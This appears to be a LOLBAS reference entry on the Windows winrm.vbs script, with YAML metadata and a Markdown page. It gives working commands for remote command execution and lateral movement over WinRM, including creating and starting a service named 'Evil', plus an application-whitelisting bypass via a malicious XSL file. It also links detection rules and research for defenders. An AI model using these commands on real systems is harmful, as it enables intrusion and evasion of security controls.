---
Acknowledgement:
- Handle: '@mattifestation'
  Person: Matt Graeber
- Handle: '@enigma0x3'
  Person: Matt Nelson
- Handle: '@subtee'
  Person: Casey Smith
- Handle: '@bohops'
  Person: Jimmy
- Person: Red Canary Company cc Tony Lamb
Author: Oddvar Moe
Code_Sample:
- Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr.reg
- Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct
Commands:
- Category: Execute
  Command: winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985
  Description: Lateral movement/Remote Command Execution via WMI Win32_Process class
    over the WinRM protocol
  MitreID: T1216
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  - Execute: Remote
  Usecase: Proxy execution
- Category: Execute
  Command: winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"}
    -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil
    -r:http://acmedc:5985
  Description: Lateral movement/Remote Command Execution via WMI Win32_Service class
    over the WinRM protocol
  MitreID: T1216
  OperatingSystem: Windows 10, Windows 11
  Privileges: Admin
  Tags:
  - Execute: CMD
  - Execute: Remote
  Usecase: Proxy execution
- Category: AWL Bypass
  Command: '%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get
    wmicimv2/Win32_Process?Handle=4 -format:pretty'
  Description: Bypass AWL solutions by copying cscript.exe to an attacker-controlled
    location; creating a malicious WsmPty.xsl in the same location, and executing
    winrm.vbs via the relocated cscript.exe.
  MitreID: T1220
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: XSL
  Usecase: Execute arbitrary, unsigned code via XSL script
Created: 2018-05-25
Description: Script used for manage Windows RM settings
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_awl_bypass.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_winrm_awl_bypass.yml
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
Full_Path:
- Path: C:\Windows\System32\winrm.vbs
- Path: C:\Windows\SysWOW64\winrm.vbs
Name: winrm.vbs
Resources:
- Link: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
- Link: https://www.youtube.com/watch?v=3gz1QmiMhss
- Link: https://github.com/enigma0x3/windows-operating-system-archaeology
- Link: https://redcanary.com/blog/lateral-movement-winrm-wmi/
- Link: https://twitter.com/bohops/status/994405551751815170
- Link: https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404
- Link: https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
mitre_data:
  technique_ids:
  - T1216
  - T1220
tags:
- lolbas/osscripts
---

# winrm.vbs

Script used for manage Windows RM settings

# Path(s)

- `C:\Windows\System32\winrm.vbs`
- `C:\Windows\SysWOW64\winrm.vbs`

# AWL Bypass Commands

Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.

```batch
%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
```

- **Usecase:** Execute arbitrary, unsigned code via XSL script
- **Privileges Required:** User
- **MitreID:** `T1220`
- **Operating System(s):** Windows 10, Windows 11



# Execute Commands

Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol

```batch
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="{CMD}"} -r:http://target:5985
```

- **Usecase:** Proxy execution
- **Privileges Required:** User
- **MitreID:** `T1216`
- **Operating System(s):** Windows 10, Windows 11



Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol

```batch
winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985
```

- **Usecase:** Proxy execution
- **Privileges Required:** Admin
- **MitreID:** `T1216`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
- https://www.youtube.com/watch?v=3gz1QmiMhss
- https://github.com/enigma0x3/windows-operating-system-archaeology
- https://redcanary.com/blog/lateral-movement-winrm-wmi/
- https://twitter.com/bohops/status/994405551751815170
- https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404
- https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Matt Graeber (@mattifestation)
- Matt Nelson (@enigma0x3)
- Casey Smith (@subtee)
- Jimmy (@bohops)
- Red Canary Company cc Tony Lamb